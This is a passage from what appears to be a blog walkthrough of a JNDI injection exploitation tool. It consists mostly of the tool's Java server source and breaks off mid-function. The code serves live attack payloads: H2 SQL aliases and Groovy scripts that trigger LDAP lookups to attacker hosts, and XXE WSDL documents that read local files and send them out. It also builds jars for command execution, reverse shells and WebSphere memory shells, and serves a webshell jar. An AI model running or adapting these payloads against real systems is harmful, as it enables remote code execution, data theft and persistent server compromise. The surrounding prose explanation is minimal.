&#125;</span><br><span class="line">                exchange.getResponseHeaders().add(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/xml; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleSQLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> exchange.getRequestURI().getHost();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sqlName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sqlName.equalsIgnoreCase(<span class="string">&quot;echo&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> String.valueOf(System.nanoTime());</span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;CREATE ALIAS &quot;</span> + name + <span class="string">&quot; AS CONCAT(&#x27;void ex()throws Exception&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;Object o = com.sun.rowset.JdbcRowSetImpl();&#x27;,&#x27; o.setDataSourceName(\&quot;ldap://&quot;</span> + host + <span class="string">&quot;:1389/TomcatBypass/TomcatEcho\&quot;);&#x27;,&#x27; &#x27;o.setAutoCommit(\&quot;true\&quot;);,&#x27;&#125;&#x27;);&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;CALL &quot;</span> + name + <span class="string">&quot;();\&quot;&#125;&quot;</span>;</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sqlName.equalsIgnoreCase(<span class="string">&quot;inject&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> String.valueOf(System.nanoTime());</span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;CREATE ALIAS &quot;</span> + name + <span class="string">&quot; AS CONCAT(&#x27;void ex()throws Exception&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;Object o = com.sun.rowset.JdbcRowSetImpl();&#x27;,&#x27; o.setDataSourceName(\&quot;ldap:// + host + :1389/inject.class\&quot;);&#x27;,&#x27; &#x27;o.setAutoCommit(\&quot;true\&quot;);,&#x27;&#125;&#x27;);&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;CALL &quot;</span> + name + <span class="string">&quot;();\&quot;&#125;&quot;</span>;</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + sqlName + <span class="string">&quot;.sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handlerGroovyRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> exchange.getRequestURI().getHost();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;/TomcatBypass/TomcatEcho&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">groovyName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(groovyName.equalsIgnoreCase(<span class="string">&quot;groovyecho&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;class demo &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    static void main()&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        com.sun.rowset.JdbcRowSetImpl o = new com.sun.rowset.JdbcRowSetImpl();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        o.setDataSourceName(\&quot;ldap://&quot;</span> + host + <span class="string">&quot;:1389&quot;</span> + exp + <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        o.setAutoCommit(true);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + groovyName + <span class="string">&quot;.groovy&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleXXELogRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">exchangeImpl</span> <span class="operator">=</span> FieldUtils.readField(exchange, <span class="string">&quot;impl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> FieldUtils.readField(exchangeImpl, <span class="string">&quot;req&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">startLine</span> <span class="operator">=</span> (String) FieldUtils.readField(request, <span class="string">&quot;startLine&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] XXE Attack Result: &quot;</span> + startLine);</span><br><span class="line">        exchange.sendResponseHeaders(<span class="number">200</span>, <span class="number">0</span>);</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleJarRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jarName.equalsIgnoreCase(<span class="string">&quot;behinder3&quot;</span>))&#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes =  <span class="literal">null</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator +<span class="string">&quot;data&quot;</span> + File.separator + <span class="string">&quot;behinder3.jar&quot;</span>;</span><br><span class="line">            <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(filename,<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            bytes = fileReader.readBytes();</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator +<span class="string">&quot;data&quot;</span> + File.separator + jarName + <span class="string">&quot;.jar&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes =  <span class="literal">null</span>;</span><br><span class="line">                <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(filename,<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                bytes = fileReader.readBytes();</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleClassRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Receive ClassRequest: &quot;</span> + className + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先从Cache中加载</span></span><br><span class="line">        <span class="keyword">if</span>(Cache.contains(className))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = Cache.get(className);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            <span class="comment">//这一步返回http请求</span></span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//找不到就从/data目录下照</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + className + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleWSDLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> exchange.getRequestURI().getQuery();</span><br><span class="line">        Map&lt;String, String&gt; params = parseQuery(query);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath().substring(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;list&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">//intended to list directories or read files on server</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> params.get(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; !file.isEmpty()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">listWsdl</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;!DOCTYPE x [\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;!ENTITY % aaa SYSTEM \&quot;file:///&quot;</span> + file + <span class="string">&quot;\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;!ENTITY % bbb SYSTEM \&quot;http://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort + <span class="string">&quot;/http.wsdl\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  %bbb;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;]&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;definitions name=\&quot;HelloService\&quot; xmlns=\&quot;http://schemas.xmlsoap.org/wsdl/\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &amp;ddd;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;/definitions&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, listWsdl.getBytes().length);</span><br><span class="line">                exchange.getResponseBody().write(listWsdl.getBytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Missing or wrong argument&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            exchange.close();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;upload&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> params.get(<span class="string">&quot;type&quot;</span>);</span><br><span class="line"></span><br><span class="line">            String[] args = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;command&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;dnslog&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;url&quot;</span>)&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;reverseshell&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;ip&quot;</span>), params.get(<span class="string">&quot;port&quot;</span>)&#125;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> createJar(type, args);</span><br><span class="line">            <span class="keyword">if</span> (jarName != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">uploadWsdl</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE a SYSTEM \&quot;jar:http://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort +</span><br><span class="line">                        <span class="string">&quot;/&quot;</span> + jarName + <span class="string">&quot;.jar!/file.txt\&quot;&gt;&lt;a&gt;&lt;/a&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, uploadWsdl.getBytes().length);</span><br><span class="line">                exchange.getResponseBody().write(uploadWsdl.getBytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Missing or wrong argument&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;http&quot;</span>))  &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">xxhttp</span> <span class="operator">=</span> <span class="string">&quot;&lt;!ENTITY % ccc &#x27;&lt;!ENTITY ddd &amp;#39;&lt;import namespace=\&quot;uri\&quot; location=\&quot;http://&quot;</span> +</span><br><span class="line">                    Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort + <span class="string">&quot;/xxelog?%aaa;\&quot;/&gt;&amp;#39;&gt;&#x27;&gt;%ccc;&quot;</span>;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, xxhttp.getBytes().length);</span><br><span class="line">            exchange.getResponseBody().write(xxhttp.getBytes());</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String, String&gt; <span class="title function_">parseQuery</span><span class="params">(String query)</span>&#123;</span><br><span class="line">        Map&lt;String,String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(String str : query.split(<span class="string">&quot;&amp;&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    String[] parts = str.split(<span class="string">&quot;=&quot;</span>,<span class="number">2</span>);</span><br><span class="line">                    params.put(parts[<span class="number">0</span>], parts[<span class="number">1</span>]);</span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                    <span class="comment">//continue</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            <span class="comment">//continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         由于我本地安装的 Websphere 在加载本地 classpath 这一步复现不成功</span></span><br><span class="line"><span class="comment">         这里不确定 websphere 这种方式在多次操作时 Class 文件名相同时是否会存在问题</span></span><br><span class="line"><span class="comment">         目前暂时认为其不会有问题，如果有问题，后面再修改</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">createJar</span><span class="params">(String type, String... params)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;xExportObject&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;command&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">CommandTemplate</span> <span class="variable">commandTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommandTemplate</span>(params[<span class="number">0</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = commandTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;dnslog&quot;</span>))&#123;</span><br><span class="line">            <span class="type">DnslogTemplate</span> <span class="variable">dnslogTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DnslogTemplate</span>(params[<span class="number">0</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = dnslogTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;reverseshell&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">ReverseShellTemplate</span> <span class="variable">reverseShellTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReverseShellTemplate</span>(params[<span class="number">0</span>], params[<span class="number">1</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = reverseShellTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;webspherememshell&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">exploitClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.feihong.ldap.template.WebsphereMemshellTemplate&quot;</span>);</span><br><span class="line">            exploitClass.setName(className);</span><br><span class="line">            exploitClass.detach();</span><br><span class="line">            bytes = exploitClass.toBytecode();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Name of Class in Jar: &quot;</span> + className);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">JarOutputStream</span> <span class="variable">jarOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarOutputStream</span>(bout);</span><br><span class="line">        jarOut.putNextEntry(<span class="keyword">new</span> <span class="title class_">ZipEntry</span>(className + <span class="string">&quot;.class&quot;</span>));</span><br><span class="line">        jarOut.write(bytes);</span><br><span class="line">        jarOut.closeEntry();</span><br><span class="line">        jarOut.close();</span><br><span class="line">        bout.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> Util.getRandomString();</span><br><span class="line">        Cache.set(jarName, bout.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jarName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>当后缀名不属于if else中的任意一种的时候会进入<code>handleFileRequest</code>中。<br>看看内部处理<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleFileRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">       <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator + <span class="string">&quot;data&quot;</span> + File.separator 